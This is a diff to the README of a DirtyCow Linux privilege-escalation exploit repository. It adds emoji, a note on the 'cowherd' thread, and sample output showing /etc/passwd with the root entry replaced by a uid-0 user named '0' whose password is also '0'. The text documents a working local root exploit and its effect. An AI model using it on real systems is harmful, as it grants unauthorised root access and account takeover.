@@ -1,4 +1,4 @@
-# DirtyCow Origin
+# DirtyCow Origin :cow:
 
 This exploit uses the pokemon exploit of the dirtycow vulnerability as a base and automatically generates a new passwd line.
 The user will be prompted for the new password when the binary is run.
@@ -40,7 +40,9 @@ Exploit adopted by Christian "FireFart" Mehlmauer
 
 https://firefart.at
 
-# DirtyCow with Cowherd
+# DirtyCow with Cowherd :cow: :woman_farmer:
+
+In this version the additional `cowherd thread` stop the original threads when the job is done.
 
 ## Compile for Debian Squeeze 32
 * Use a docker target os to compile the exploit 
@@ -60,7 +62,7 @@ root@07ccd56551fe:/tmp# head -n 20 cowherd.c
 * Use it as the original
 
 
-# Turtle :turtle:
+# Turtle :rabbit: :turtle: 
 
 ## Compile for Debian Wheezy 64
 
@@ -116,6 +118,14 @@ $ ./turtle 256 1 3
      8,054 µs	⚬ ● end process[POKEMON] >> thread[main] >>> function[pokemon_run]🐮🔄
      8,061 µs	● end process[POKEMON] >> thread[main]
 
+$ head -n 3 /etc/passwd
+0:002UBq03Nvvos:0:0:::/bin/bash
+daemon:x:1:1:daemon:/usr/sbin:/bin/sh
+bin:x:2:2:bin:/bin:/bin/sh
+...
 ```
+Now
+* the name of the user having the `id 0` (former `root`) is `0` and is password too :hushed:
+* the integrity the second line of the `/etc/passwd` is preserved because the lenght of the first line is unchanged :wink:
 
 
